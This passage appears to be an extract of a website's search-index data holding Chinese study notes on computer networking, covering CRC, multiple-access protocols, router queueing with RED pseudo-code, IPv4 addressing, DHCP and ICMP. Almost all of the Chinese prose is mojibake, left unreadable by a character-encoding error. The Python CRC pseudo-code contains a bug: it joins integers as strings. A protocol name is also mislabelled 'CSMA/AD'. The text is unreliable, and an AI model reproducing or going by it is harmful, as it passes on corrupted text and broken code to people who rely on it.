çš„å¤šé¡¹å¼ï¼Œæ¯”ç‰¹ä¸²çš„æ“ä½œè¢«è§£é‡Šä½å¤šé¡¹å¼ç®—æœ¯ã€‚\nç”Ÿæˆå¤šé¡¹å¼ Gï¼ˆgeneratorï¼‰ï¼šThe sender and receiver must first agree on an r + 1 bit pattern, known as a generator. ï¼ˆAssert max_bit_of(G) == 1 and bit_length_of(G) == r+1ï¼‰\nå‘é€æ–¹é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼è®¡ç®— Rï¼š\n  Math formula:\n $$(D \u0026laquo; r) \\oplus R \\equiv 0 \\mod{G}$$ å…¶ä¸­ D æ˜¯ä¼ è¾“ä¿¡æ¯ï¼Œr æ˜¯åå•†çš„ç»™å®šæ¯”ç‰¹é•¿åº¦ï¼ŒG æ˜¯é•¿ä½ r+1ï¼Œæœ€é«˜æ¯”ç‰¹ä½ä¸º 1 çš„æ¯”ç‰¹æ¨¡å¼ã€‚    Pseudo-code:\ndef crc_remainder(D, G, init):  \u0026#39;\u0026#39;\u0026#39; Calculates the CRC remainder of a string of bits using a chosen polynomial. initial_filler should be \u0026#39;1\u0026#39; or \u0026#39;0\u0026#39;. \u0026#39;\u0026#39;\u0026#39;  G, d = G.lstrip(\u0026#39;0\u0026#39;), len(D)  DR = [int(i) for i in (D + init * (len(G) - 1))]  while 1 in DR[:d]:  pos = DR.index(1)  for i in range(len(G)):  DR[pos + i] ^= int(G[i])  return \u0026#39;\u0026#39;.join(DR)[d:]   description graph: (padding pattern graph and generation flow)\nGiven: D=11010011101100, G=1011\r11010011101100 000 \u0026lt;--- input right padded by 3 bits\r1011 \u0026lt;--- divisor\r01100011101100 000 \u0026lt;--- result (note the first four bits are the XOR with the divisor beneath, the rest of the bits are unchanged)\r1011 \u0026lt;--- divisor ...\r00111011101100 000\r1011\r00010111101100 000\r1011\r00000001101100 000 \u0026lt;--- note that the divisor moves over to align with the next 1 in the dividend (since quotient for that step was zero)\r1011 (in other words, it doesn\u0026#39;t necessarily move one bit per iteration)\r00000000110100 000\r1011\r00000000011000 000\r1011\r00000000001110 000\r1011\r00000000000101 000\r101 1\r-----------------\r00000000000000 100 \u0026lt;--- remainder (3 bits). Division algorithm stops here as dividend is equal to zero.   å›½é™…æ ‡å‡†å·²ç»å®šä¹‰äº† 8ã€16ã€32 æ¯”ç‰¹çš„ç”Ÿæˆå¤šé¡¹å¼ Gï¼ŒCRC-32 çš„æ ‡å‡†è¢«å¤šç§é“¾è·¯çº§çš„ IEEE é‡‡ç”¨\n  ä½¿ç”¨çš„ä¸€ä¸ªç”Ÿæˆå¤šé¡¹å¼ä¸ºï¼š$$G_{CRC-32} = 0x04C11DB7$$\n  å…¶ç”Ÿæˆå¤šé¡¹å¼ä¸ºï¼š$$x^{{32}}+x^{{26}}+x^{{23}}+x^{{22}}+x^{{16}}+x^{{12}}+x^{{11}}+x^{{10}}+x^{8}+x^{7}+x^{5}+x^{4}+x^{2}+x+1$$\n  å¤šè·¯è®¿é—®é“¾è·¯å’Œåè®® #  å¤šè·¯è®¿é—®é—®é¢˜ï¼ˆmultiple access problemï¼‰ï¼šå¦‚ä½•åè°ƒå¤šä¸ªå‘é€å’Œæ¥æ”¶ç»“ç‚¹å¯¹ä¸€ä¸ªå…±äº«ä¿¡é“çš„è®¿é—®ã€‚\nå¤šè·¯è®¿é—®åè®®ï¼ˆmultiple access protocolï¼‰ï¼šä¿¡é“åˆ’åˆ†åè®®ï¼ˆchannel partitioning protocolï¼‰ã€éšæœºæ¥å…¥åè®®ï¼ˆrandom access protocolï¼‰å’Œè½®æµåè®®ï¼ˆtaking-turns protocolï¼‰\nç¢°æ’ï¼ˆcollideï¼‰ï¼šæ‰€æœ‰ç»“ç‚¹å¯ä»¥åŒæ—¶ä¼ è¾“å¸§ï¼Œå¤šä¸ªç»“ç‚¹å¯èƒ½ä¼šåŒæ—¶ä¼ è¾“å¸§ï¼Œæ‰€æœ‰ç»“ç‚¹åŒæ—¶æ¥æ”¶åˆ°å¤šä¸ªå¸§ï¼Œå¯¼è‡´æ²¡æœ‰ä¸€ä¸ªç»“ç‚¹èƒ½å¤Ÿæœ‰æ•ˆåœ°è·å¾—ä»»ä½•ä¼ è¾“çš„å¸§ã€‚\nä¿¡é“åˆ’åˆ†åè®® #  èƒ½å¤Ÿç”¨äºæ‰€æœ‰å…±äº«ä¿¡é“ç»“ç‚¹ä¹‹é—´åˆ’åˆ†å¹¿æ’­ä¿¡é“å¸¦å®½æŠ€æœ¯ï¼š\n æ—¶åˆ†å¤šè·¯å¤ç”¨ï¼ˆTDMï¼‰ï¼šæŒ‰æ—¶é—´å¤ç”¨ï¼› é¢‘åˆ†å¤šè·¯å¤ç”¨ï¼ˆFDMï¼‰ï¼šæŒ‰é¢‘ç‡å¤ç”¨ï¼š ç åˆ†å¤šå€ï¼ˆCode Division Multiple Access, CDMAï¼‰ï¼šç»™æ¯ä¸ªç»“ç‚¹åˆ†é…ä¸€ç§ä¸åŒçš„ç¼–ç ã€‚  éšæœºæ¥å…¥åè®® #  ä¸€ä¸ªä¼ è¾“æ€»æ˜¯ä»¥ä¿¡é“çš„å…¨éƒ¨é€Ÿç‡è¿›è¡Œå‘é€ï¼Œå½“æœ‰ç¢°æ’æ—¶ï¼Œéšæœºç­‰å¾…ä¸€ä¸ªå»¶æ—¶åï¼Œé‡æ–°å‘é€ã€‚\n  æ—¶éš™ ALOHA\n  è½½æ³¢ä¾¦å¬å¤šè·¯è®¿é—® (Carrier Sense Multiple Access, CSMA)ï¼š\n  ä¸¤ä¸ªé‡è¦çš„åŸåˆ™ï¼š\n è¯´è¯ä¹‹å‰å…ˆå¬ï¼› å¦‚æœä¸ä»–äººåŒæ—¶å¼€å§‹è¯´è¯ï¼Œåœæ­¢è¯´è¯ï¼›    è¯¥åè®®åŠ å…¥äº†è½½æ³¢ä¾¦å¬ (carrier sense) è§„åˆ™ï¼Œå³åœ¨å‘é€ä¿¡å·ä¹‹å‰ä¾¦å¬ä¿¡é“æ˜¯å¦ç©ºé—²ã€‚\n  ç«¯åˆ°ç«¯ä¿¡å·ä¼ æ’­æ—¶å»¶ (channel propagation delay) åœ¨å†³å®šå…¶æ€§èƒ½æ–¹é¢èµ·å†³å®šæ€§çš„ä½œç”¨ã€‚\n    å…·æœ‰ç¢°æ’æ£€æµ‹ (collision detection) çš„è½½æ³¢ä¾¦å¬å¤šè·¯è®¿é—® (CSMA/CD)ï¼š\n åœ¨ CSMA çš„åŸºç¡€ä¸Šï¼Œå½“æŸèŠ‚ç‚¹æ£€æµ‹åˆ°ç¢°æ’æ—¶å°†ç«‹å³åœæ­¢ä¼ è¾“ï¼Œéšæœºç­‰å¾…ä¸€ä¸ªæ—¶é—´å»¶è¿Ÿåé‡æ–°ä¼ è¾“ ä»¥å¤ªç½‘ä»¥åŠ DOCSIS ç”µç¼†ç½‘ç»œå¤šè·¯è®¿é—®åè®® [DOCSIS 2011] ä½¿ç”¨äº†äºŒè¿›åˆ¶æŒ‡æ•°åé€€ï¼ˆbinary exponential backoffï¼‰ç®—æ³•ï¼šå¯¹äºç»å†äº† n æ­¤ç¢°æ’çš„å¸§ï¼Œéšæœºåœ°ä» $${0, 1, 2, \u0026hellip;, 2^n-1}$$ ä¸­é€‰æ‹©ä¸€ä¸ªæ•°ä½œä¸ºæ—¶é—´é—´éš”è¿›è¡Œç­‰å¾…ã€‚    å…·æœ‰ç¢°æ’é¿å…çš„è½½æ³¢ä¾¦å¬å¤šè·¯è®¿é—®ï¼ˆCSMA/ADï¼‰ã€‚\n  è½®æµåè®® #  "},{"id":387,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/3.%E7%BD%91%E7%BB%9C%E5%B1%82/%E7%BD%91%E7%BB%9C%E5%B1%82/","title":"ç½‘ç»œå±‚","section":"3.ç½‘ç»œå±‚","content":" å­¦ä¹ åœ°å€ï¼š\n ã€Šè®¡ç®—æœºç½‘ç»œ è‡ªé¡¶å‘ä¸‹æ–¹æ³•ã€‹ åŸä¹¦åœ°å€ï¼šhttps://www.net.t-labs.tu-berlin.de/teaching/computer_networking/   ç½‘ç»œå±‚ #  æ¦‚å¿µ #  è½¬å‘å’Œè·¯ç”±é€‰æ‹© #  ç½‘ç»œå±‚çš„ä½œç”¨ä»è¡¨é¢ä¸Šçœ‹æä¸ºç®€å•ï¼Œéœ€è¦ä¸¤ç§é‡è¦çš„ç½‘ç»œå±‚åŠŸèƒ½ï¼š\n è½¬å‘ï¼šå½“ä¸€ä¸ªåˆ†ç»„åˆ°è¾¾è·¯ç”±å™¨çš„ä¸€æ¡è¾“å…¥é“¾è·¯æ—¶ï¼Œè·¯ç”±å™¨å¿…é¡»å°†è¯¥åˆ†ç»„ç§»åŠ¨åˆ°åˆé€‚çš„è¾“å…¥é“¾è·¯ã€‚ è·¯ç”±é€‰æ‹©ï¼šå½“åˆ†ç»„å‘é€æ–¹æµå‘æ¥æ”¶æ–¹æ—¶ï¼Œç½‘ç»œå±‚å¿…é¡»å†³å®šè¿™äº›åˆ†ç»„æ‰€é‡‡ç”¨çš„è·¯ç”±æˆ–è·¯å¾„ã€‚è®¡ç®—è¿™äº›è·¯å¾„çš„ç®—æ³•è¢«ç§°ä½œè·¯ç”±é€‰æ‹©ç®—æ³•ï¼ˆrouting algorithmï¼‰ã€‚  è½¬å‘è¡¨ï¼ˆforwarding tableï¼‰ï¼š\n è·¯ç”±å™¨é€šè¿‡æ£€æŸ¥åˆ°è¾¾åˆ†ç»„é¦–éƒ¨å­—æ®µçš„å€¼æ¥è½¬å‘åˆ†ç»„ï¼Œç„¶åä½¿ç”¨è¯¥å€¼åœ¨è·¯ç”±å™¨çš„è½¬å‘è¡¨ä¸­ç´¢å¼•æŸ¥è¯¢ã€‚  ç½‘ç»œæœåŠ¡æ¨¡å‹ #  ç½‘ç»œæœåŠ¡æ¨¡å‹ï¼ˆnetwork service modelï¼‰å®šä¹‰äº†åˆ†ç»„åœ¨å‘é€ä¸æ¥æ”¶ç«¯ç³»ç»Ÿä¹‹é—´çš„ç«¯åˆ°ç«¯è¿è¾“ç‰¹æ€§ï¼š\n ä¸€ä¸ªåˆ†ç»„çš„éœ€æ±‚ç‰¹æ€§ï¼š  ç¡®ä¿äº¤ä»˜ï¼šè¯¥æœåŠ¡ç¡®ä¿åˆ†ç»„å°†æœ€ç»ˆåˆ°è¾¾å…¶ç›®çš„åœ°ã€‚ å…·æœ‰æ—¶å»¶ä¸Šç•Œçš„ç¡®ä¿äº¤ä»˜ï¼šåœ¨ç‰¹å®šçš„æ—¶å»¶ä¸Šé™å†…äº¤ä»˜ï¼ˆå¦‚ 100msï¼‰   åˆ†ç»„æµéœ€è¦æä¾›ä¸‹åˆ—æœåŠ¡ï¼š  æœ‰åºåˆ†ç»„äº¤ä»˜ï¼šç¡®ä¿åˆ†ç»„ä»¥å®ƒä»¬å‘é€çš„é¡ºåºåˆ°è¾¾ç›®çš„åœ°ã€‚ ç¡®ä¿æœ€å°å¸¦å®½ï¼šåªè¦å‘é€ä¸»æœºä½äºç»™å®šæ¯”ç‰¹ç‡çš„é€Ÿç‡ä¼ è¾“æ¯”ç‰¹ï¼Œåˆ™æ»¡è¶³ ç¡®ä¿äº¤ä»˜ å’Œ åœ¨æ—¶å»¶ä¸Šç•Œå†…ç¡®ä¿äº¤ä»˜ çš„ç‰¹æ€§ã€‚ ç¡®ä¿æœ€å¤§æ—¶å»¶æŠ–åŠ¨ï¼šç¡®ä¿ä½äºå‘é€æ–¹å‘é€ä¸¤ä¸ªç›¸ç»§åˆ†ç»„ä¹‹é—´çš„æ—¶é—´é‡ç­‰äºç›®çš„åœ°æ¥æ”¶åˆ°å®ƒä»¬ä¹‹é—´çš„æ—¶é—´é‡ å®‰å…¨æ€§æœåŠ¡ï¼šä½¿ç”¨ä»…ç”±æºå’Œç›®çš„ä¸»æœºæ‰€çŸ¥æ™“çš„ä¸€ä¸ªç§˜å¯†å›è¯å¯†é’¥ã€‚    ä¸‹é¢è¡¨æ ¼ç»™å‡ºäº†ä¸‰ç§æœåŠ¡æ¨¡å‹ï¼š\n   ç½‘ç»œä½“ç³»ç»“æ„ æœåŠ¡æ¨¡å‹ å¸¦å®½ä¿è¯ æ— ä¸¢åŒ…ä¿è¯ æœ‰åº å®šæ—¶ æ‹¥å¡æŒ‡ç¤º     å› ç‰¹ç½‘ å°½åŠ›è€Œä¸º æ—  æ—  ä»»ä½•å¯èƒ½ ä¸ç»´æŠ¤ æ—    ATM CBR ä¿è¯æ’å®šé€Ÿç‡ æ˜¯ æœ‰åº ç»´æŠ¤ ä¸å‡ºç°æ‹¥å¡   ATM ABR ä¿è¯æœ€å°é€Ÿç‡ æ—  æœ‰åº ä¸ç»´æŠ¤ æä¾›æ‹¥å¡æŒ‡ç¤º    è™šç”µè·¯å’Œæ•°æ®åŒ…ç½‘ç»œ #  ä»…åœ¨ç½‘ç»œå±‚æä¾›è¿æ¥æœåŠ¡çš„è®¡ç®—æœºç½‘ç»œç§°ä¸ºè™šç”µè·¯ç½‘ç»œï¼ˆVirtual-Circuit VCï¼‰ã€‚\nä»…åœ¨ç½‘ç»œå±‚æä¾›æ— è¿æ¥æœåŠ¡çš„è®¡ç®—æœºç½‘ç»œç§°ä¸ºæ•°æ®æŠ¥ç½‘ç»œï¼ˆdatagram networkï¼‰ã€‚\nInternet æ˜¯æ•°æ®æŠ¥ç½‘ç»œã€‚\nè·¯ç”±å™¨çš„å·¥ä½œåŸç† #  ä¸€å°è·¯ç”±å™¨ä¸»è¦ç”±ä»¥ä¸‹ 4 ä¸ªéƒ¨åˆ†ç»„æˆï¼š\nè¾“å…¥ç«¯å£ #  è¾“å…¥ç«¯å£é€šè¿‡ä»¥ä¸‹æ–¹å¼è¿›è¡Œå¤„ç†ï¼š\nå‡å®šè½¬å‘è¡¨å·²ç»å­˜åœ¨ï¼Œä»æ¦‚å¿µä¸Šæ¥è®²è¡¨æŸ¥æ‰¾æ˜¯ç®€å•çš„ï¼Œå³æˆ‘ä»¬åªæ˜¯æœç´¢è½¬å‘è¡¨æŸ¥æ‰¾æœ€é•¿å‰ç¼€åŒ¹é…ã€‚\näº¤æ¢ç»“æ„ #  ä¸»è¦æœ‰ä¸‰ç§äº¤æ¢æ–¹å¼ï¼š\nè¾“å‡ºç«¯å£ #  è¾“å‡ºç«¯å£é€šè¿‡ä»¥ä¸‹æ–¹å¼å¤„ç†ï¼š\nWhere Does Queueing Occur? #  å‡å®šéœ€è¦è·¯ç”±å™¨ç¼“å­˜æ¥å¸æ”¶æµé‡è´Ÿè½½çš„æ³¢åŠ¨ï¼Œä¸€ä¸ªè‡ªç„¶è€Œç„¶çš„é—®é¢˜å°±æ˜¯éœ€è¦å¤šå°‘ç¼“å­˜ã€‚\nå¯¹äºç¼“å­˜é•¿åº¦çš„ç»éªŒæ–¹æ³•æ˜¯ï¼š\n ç¼“å­˜æ•°é‡ï¼ˆBï¼‰åº”è¯¥ç­‰äºå¹³å‡å¾€è¿”å»¶æ—¶ï¼ˆRTTï¼‰ä¹˜ä»¥é“¾è·¯çš„å®¹é‡ï¼ˆCï¼‰ï¼Œå³ $$B = RTT \\cdot C$$ æœ‰ç†è®ºå’Œè¯•éªŒç ”ç©¶è¡¨æ˜ï¼Œå½“æœ‰å¤§é‡çš„ TCP æµï¼ˆNï¼‰é€šè¿‡ä¸€ä¸ªé“¾è·¯æ—¶ï¼Œç¼“å­˜æ‰€éœ€è¦çš„çš„æ•°é‡æ˜¯ $${\\displaystyle B = \\frac{RTT \\cdot C}{\\sqrt{N}} }$$  è¾“å‡ºç«¯å£æ’é˜Ÿçš„åæœå°±æ˜¯ï¼Œåœ¨è¾“å‡ºç«¯å£ä¸Šçš„ä¸€ä¸ªåˆ†ç»„è°ƒåº¦ç¨‹åºï¼ˆpacket schedulerï¼‰å¿…é¡»åœ¨è¿™äº›æ’é˜Ÿçš„åˆ†ç»„ä¸­é€‰æ‹©ä¸€ä¸ªæ¥å‘é€ï¼š\n è¿™ç§é€‰æ‹©å¯èƒ½æ˜¯æ ¹æ®ç®€å•çš„åŸåˆ™æ¥å®šï¼Œå¦‚å…ˆæ¥å…ˆæœåŠ¡ï¼ˆFCFSï¼‰è°ƒåº¦ã€‚ æˆ–è€…æ›´åŠ å¤æ‚çš„è°ƒåº¦è§„åˆ™ï¼Œå¦‚åŠ æƒå…¬å¹³æ’é˜Ÿï¼ˆWFQï¼‰  ç±»ä¼¼çš„ï¼Œå¦‚æœæ²¡æœ‰è¶³å¤Ÿçš„å†…å­˜æ¥ç¼“å­˜ä¸€ä¸ªå…¥åˆ†ç»„ï¼Œé‚£ä¹ˆå¿…é¡»ä¸¢å¼ƒä¸€äº›åˆ†ç»„ã€‚å·²ç»æå‡ºäº†è®¸å¤šåˆ†ç»„ä¸¢å¼ƒå’Œæ ‡è®°çš„ç­–ç•¥ï¼Œè¿™äº›ç­–ç•¥ç»Ÿç§°ä¸ºä¸»åŠ¨é˜Ÿåˆ—ç®¡ç†ï¼ˆActive Queue Management, AQMï¼‰ç®—æ³•ï¼š\n  éšæœºæ—©æœŸæ£€æµ‹ï¼ˆRandom Early Detection, REDï¼‰ç®—æ³•æ˜¯ä¸€ç§å¾—åˆ°æœ€å¹¿æ³›ç ”ç©¶å’Œå®ç°çš„ AQM ç®—æ³•ï¼š\nvoid newPacket(Packet p){ \tif (queue.length \u0026lt; min_val) queue.push_back(p);  else if (queue.length \u0026gt; min_val \u0026amp;\u0026amp; queue.length \u0026lt; max_val){  if(randF(queue.length, min_val, max_val)) drop p;  else queue.push_back(p);  }else drop p; } å…¶ä¸­ï¼šmin_val å’Œ max_val æ˜¯ç»™å®šçš„é˜ˆå€¼ï¼ŒrandF æŒ‰ç…§ä¸€å®šæ¦‚ç‡è¿”å› true çš„å‡½æ•°ã€‚\n  å¦‚æœäº¤æ¢ç»“æ„ä¸èƒ½å¿«å¾—æ˜¯æ‰€æœ‰åˆ°è¾¾åˆ†ç»„æ— å»¶æ—¶åœ°é€šè¿‡å®ƒä¼ é€ï¼Œåˆ™åœ¨è¾“å…¥ç«¯å£ä¹Ÿå°†å‡ºç°åˆ†ç»„æ’é˜Ÿï¼Œå› ä¸ºåˆ°è¾¾çš„åˆ†ç»„å¿…é¡»åŠ å…¥è¾“å…¥ç«¯å£é˜Ÿåˆ—ä¸­ï¼Œä»¥ç­‰å¾…é€šè¿‡äº¤æ¢ç»“æ„ä¼ é€åˆ°è¾“å‡ºç«¯å£ã€‚\nè¿™ç§ç°è±¡å«åšè¾“å…¥æ’é˜Ÿäº¤æ¢æœºä¸­çš„çº¿è·¯å‰éƒ¨é˜»å¡ï¼ˆHead-Of-the-Line, HOLï¼‰ï¼Œå³åœ¨ä¸€ä¸ªè¾“å…¥é˜Ÿåˆ—ä¸­æ’é˜Ÿçš„åˆ†ç»„å¿…é¡»ç­‰å¾…é€šè¿‡äº¤æ¢ç»“æ„å‘é€ï¼ˆå³ä½¿è¾“å‡ºç«¯å£æ˜¯ç©ºé—²çš„ï¼‰ï¼Œå› ä¸ºå®ƒè¢«ä½äºçº¿è·¯å‰éƒ¨çš„å¦ä¸€åˆ†ç»„æ‰€é˜»å¡ã€‚\nç½‘é™…åè®® #  Internet çš„ç½‘ç»œå±‚ä¸»è¦æœ‰ä¸‰ä¸ªä¸»è¦ç»„ä»¶ï¼š\næ•°æ®æŠ¥æ ¼å¼ #  ç½‘ç»œå±‚çš„åˆ†ç»„è¢«ç§°ä¸ºæ•°æ®æŠ¥ï¼ŒIPv4 çš„æ•°æ®æŠ¥æ ¼å¼å¦‚ä¸‹ï¼š\nIP æ•°æ®æŠ¥åˆ†ç‰‡ï¼š\n å› ä¸ºä¸åŒçš„é“¾è·¯å±‚åè®®æ‹¥æœ‰ä¸åŒçš„ MTUï¼ˆMaximum Transmission Unit, ä¸€ä¸ªé“¾è·¯å±‚å¸§èƒ½å¤Ÿæ‰¿è½½çš„æœ€å¤§æ•°æ®é‡ï¼‰ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å°† IP æ•°æ®æŠ¥ä¸­çš„æ•°æ®åˆ†ç‰‡ç§°å¤šä¸ªè¾ƒå°çš„æ•°æ®æŠ¥ï¼Œç”¨å•ç‹¬çš„é“¾è·¯å±‚å¸§å°è£…è¿™äº›è¾ƒå°çš„ IP æ•°æ®æŠ¥ï¼Œç„¶åå‘è¾“å‡ºé“¾è·¯ä¸Šå‘é€è¿™äº›å¸§ã€‚æ¯ä¸ªè¿™äº›è¾ƒå°çš„æ•°æ®æŠ¥éƒ½ç§°åšç‰‡ï¼ˆfragmentï¼‰ã€‚ ä¸ºäº†è®©ç›®çš„ä¸»æœºå°†è¿™äº›æ¥æ”¶åˆ°çš„ç‰‡æ‹¼æ¥åˆ°ä¸€èµ·ä»¥å½¢æˆåˆå§‹çš„æ•°æ®æŠ¥ï¼ŒIPv4 çš„è®¾è®¡è€…å°†ä»¥ä¸‹ä¸‰ä¸ªå­—æ®µæ”¾åœ¨ IP æ•°æ®æŠ¥çš„é¦–éƒ¨ä¸­ï¼š  æ ‡å¿—ï¼Œflagï¼Œflag=0 è¡¨ç¤ºè¿™æ˜¯æœ€åä¸€ä¸ªç‰‡ åç§»ï¼Œoffsetï¼Œè¡¨ç¤ºç›¸å¯¹åˆå§‹ä½ç½®çš„åç§»ï¼Œè§„å®šä¸ºä»¥ 8 å­—èŠ‚å—ä¸ºå•ä½ã€‚ æ ‡è¯†å·ï¼ŒIDï¼Œæ ‡è¯†å·ç›¸åŒçš„å±äºåŒä¸€ç‰‡æ•°æ®ã€‚    IPv4 ç¼–å€ #  å­ç½‘ï¼š\n  åœ¨ç½‘ç»œæ‹“æ‰‘ç»“æ„ä¸­ï¼Œä»»æ„ä¸¤ä¸ªè·¯ç”±å™¨æˆ–ä¸»æœºçš„ç«¯å£ä¹‹é—´çš„éƒ¨åˆ†å¯ä»¥å½¢æˆä¸€ä¸ªç½‘ç»œå²›ï¼Œæ¯ä¸€ä¸ªè¿™ç§ç½‘ç»œå²›ä¾¿ç§°ä¸ºä¸€ä¸ªå­ç½‘ï¼ˆsubnetï¼‰ã€‚\n  IP ç¼–å€ä¼šä¸ºå­ç½‘åˆ†é…ä¸€ä¸ªåœ°å€ï¼Œæ¯”å¦‚ï¼š223.1.1.0/24ï¼Œå…¶ä¸­ /24 çš„è®°æ³•ç§°ä½œå­ç½‘æ©ç ï¼Œä»–è¡¨ç¤º 32 ä½æ¯”ç‰¹ä¸­æœ€å·¦ä¾§çš„ 24 æ¯”ç‰¹å®šä¹‰äº†å­ç½‘åœ°å€ã€‚\n  CIDRï¼šå› ç‰¹ç½‘çš„åœ°å€åˆ†é…ç­–ç•¥è¢«ç§°ä¸ºæ— ç±»åˆ«åŸŸé—´è·¯ç”±é€‰æ‹©ï¼ˆClassless Inter-domain Routing, CIDRï¼‰ï¼Œå®ƒå°†å­ç½‘å¯»å€çš„æ¦‚å¿µä¸€èˆ¬åŒ–äº†ã€‚\n å½¢å¼ä½ a.b.c.d/x çš„åœ°å€çš„ x æœ€é«˜æ¯”ç‰¹æ„æˆäº† IP åœ°å€çš„ç½‘ç»œéƒ¨åˆ†ï¼Œå¹¶ä¸”ç»å¸¸è¢«ç§°ä½œè¯¥åœ°å€çš„å‰ç¼€ï¼ˆprefixï¼Œæˆ–ç½‘ç»œå‰ç¼€ï¼‰ ä¸€ä¸ªåœ°å€å‰©ä½™çš„ 32-x æ¯”ç‰¹å¯è®¤ä¸ºæ˜¯ç”¨äºåŒºåˆ«è¯¥ç»„ç»‡å†…éƒ¨è®¾å¤‡çš„ã€‚  åœ¨ CIDR è¢«é‡‡ç”¨ä¹‹å‰ï¼ŒIP åœ°å€çš„ç½‘ç»œéƒ¨åˆ†è¢«é™åˆ¶ä¸ºé•¿åº¦ä¸º 8ã€16 å’Œ 24 æ¯”ç‰¹å­ç½‘åœ°å€çš„å­ç½‘åˆ†åˆ«è¢«ç§°ä¸º Aã€B å’Œ C ç±»ç½‘ç»œã€‚\nè·å–ä¸€å—åœ°å€ #   ç½‘ç»œç®¡ç†å‘˜ä¸ ISP(Internet Service Provider) è”ç³»ï¼Œè¯¥ ISP ä¼šä»å·²ç»åˆ†ç»™å®ƒçš„æ›´å¤§çš„åœ°å€å—ä¸­æä¾›ä¸€äº›åœ°å€ã€‚ å‘ ICANN(Internet Corporation for Assigned Names and Numbers) æèµ·ç”³è¯·ï¼ˆåŸºäº [RFC 2050]ï¼‰  PostScriptï¼šICANN é™¤äº†ç®¡ç† IP åœ°å€å¤–ï¼Œè¿˜ç®¡ç† DNS æ ¹æœåŠ¡å™¨ï¼Œè¿˜è´Ÿè´£åˆ†é…åŸŸåä¸è§£å†³åŸŸåçº·äº‰ã€‚\nè·å–ä¸»æœºåœ°å€ #  æŸç»„ç»‡ä¸€æ—¦è·å¾—äº†ä¸€å—åœ°å€ï¼Œå®ƒå°±å¯ä»¥ä¸ºæœ¬ç»„ç»‡å†…çš„ä¸»æœºä¸è·¯ç”±å™¨æ¥å£é€ä¸ªåˆ†é… IP åœ°å€ã€‚\nä¸»æœºåœ°å€å¯ä»¥æ‰‹åŠ¨é…ç½®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ DHCP(Dynamic Host Configuration, DHCP) æ¥å®Œæˆã€‚\nDHCPï¼š\n  DHCP å…è®¸ä¸»æœºè‡ªåŠ¨è·å–ï¼ˆè¢«åˆ†é…ï¼‰ä¸€ä¸ª IP åœ°å€ï¼Œä¸»æœºè¿˜å¯ä»¥å¾—çŸ¥å­ç½‘æ©ç ã€ç¬¬ä¸€è·³è·¯ç”±å™¨ï¼ˆæˆ–ç§°é»˜è®¤ç½‘å…³ï¼‰ä¸å®ƒçš„æœ¬åœ° DNS æœåŠ¡å™¨åœ°å€ç­‰ã€‚\n  ç½‘ç»œç®¡ç†å‘˜å¯ä»¥é…ç½® DHCPï¼Œä»¥ä½¿æŸç»™å®šçš„ä¸»æœºæ¯æ¬¡ä¸ç½‘ç»œè¿æ¥æ—¶èƒ½å¾—åˆ°ä¸€ä¸ªç›¸åŒçš„ IP åœ°å€ï¼Œæˆ–è€…æŸä¸»æœºå°†è¢«åˆ†é…ä¸€ä¸ªä¸´æ—¶çš„ IP åœ°å€ã€‚\n  DHCP æ˜¯ä¸€ä¸ªå®¢æˆ·-æœåŠ¡å™¨åè®®ï¼Œå®ƒå·¥ä½œæµç¨‹å¦‚ä¸‹ï¼š\n DHCP æœåŠ¡å™¨å‘ç°ï¼šæ–°åˆ°æ¥çš„ä¸»æœºä»¥å‘é€ DHCP å‘ç°æŠ¥æ–‡ å¹¿æ’­ä¿¡å·ã€‚ DHCP æœåŠ¡å™¨æä¾›ï¼šDHCP æ”¶åˆ°ä¸€ä¸ªå‘ç°æŠ¥æ–‡åï¼Œä½¿ç”¨ DHCP æä¾›æŠ¥æ–‡ å¹¿æ’­ä¿¡å·è¿›è¡Œå“åº”ã€‚ DHCP è¯·æ±‚ï¼šæ–°åˆ°è¾¾çš„å®¢æˆ·ä»ä¸€ä¸ªæˆ–å¤šä¸ªæœåŠ¡å™¨æä¾›ä¸­é€‰æ‹©ä¸€ä¸ªå¹¶å‘é€‰ä¸­çš„æœåŠ¡å™¨æä¾›ä¸€ä¸ª DHCP è¯·æ±‚æŠ¥æ–‡ è¿›è¡Œå“åº”ã€‚ DHCP ACKï¼šæœåŠ¡å™¨ç”¨ DHCP ACK æŠ¥æ–‡ è¯å®æ‰€è¦æ±‚çš„å‚æ•°ã€‚    å› ç‰¹ç½‘æ§åˆ¶æŠ¥æ–‡åè®® #  å› ç‰¹ç½‘æ§åˆ¶æŠ¥æ–‡åè®®ï¼ˆICMPï¼‰æ˜¯è¢«ä¸»æœºå’Œè·¯ç”±å™¨ç”¨æ¥å½¼æ­¤æ²Ÿé€šç½‘ç»œå±‚ä¿¡æ¯çš„åè®®ã€‚å®ƒæœ€å…¸å‹çš„ç”¨é€”å°±æ˜¯å·®é”™æŠ¥å‘Šã€‚ICMP æŠ¥æ–‡æœ‰ä¸€ä¸ªç±»å‹å­—æ®µå’Œä¸€ä¸ªç¼–ç å­—æ®µï¼Œå¹¶ä¸”åŒ…å«å¼•èµ·è¯¥ ICMP æŠ¥æ–‡é¦–æ¬¡ç”Ÿæˆçš„ IP æ•°æ®æŠ¥çš„é¦–éƒ¨å’Œå‰ 8 å­—èŠ‚å†…å®¹ã€‚\nåº”ç”¨ ICMP çš„ä¸¤ä¸ªç¨‹åºï¼špingï¼Œtraceroute\nè·¯ç”±é€‰æ‹©ç®—æ³• #  ä¸»æœºé€šå¸¸ç›´æ¥ä¸ç¬¬ä¸€å°è·¯ç”±å™¨ç›¸è¿ï¼Œè¯¥è·¯ç”±å™¨å³ä¸ºä¸»æœºçš„é»˜è®¤è·¯ç”±å™¨ï¼ˆdefault routerï¼‰ï¼Œåˆç§°ä½œè¯¥ä¸»æœºçš„ç¬¬ä¸€è·³è·¯ç”±å™¨ï¼ˆfirst-hop routerï¼‰ã€‚æˆ‘ä»¬æŠŠæºä¸»æœºçš„é»˜è®¤è·¯ç”±å™¨ç§°ä½œæºè·¯ç”±å™¨ï¼ˆsource routerï¼‰ï¼Œç›®çš„ä¸»æœºçš„é»˜è®¤è·¯ç”±å™¨ç§°ä½œç›®çš„è·¯ç”±å™¨ï¼ˆdestination routerï¼‰ã€‚\né‚£ä¹ˆè·¯ç”±é€‰æ‹©ç®—æ³•ï¼š\n 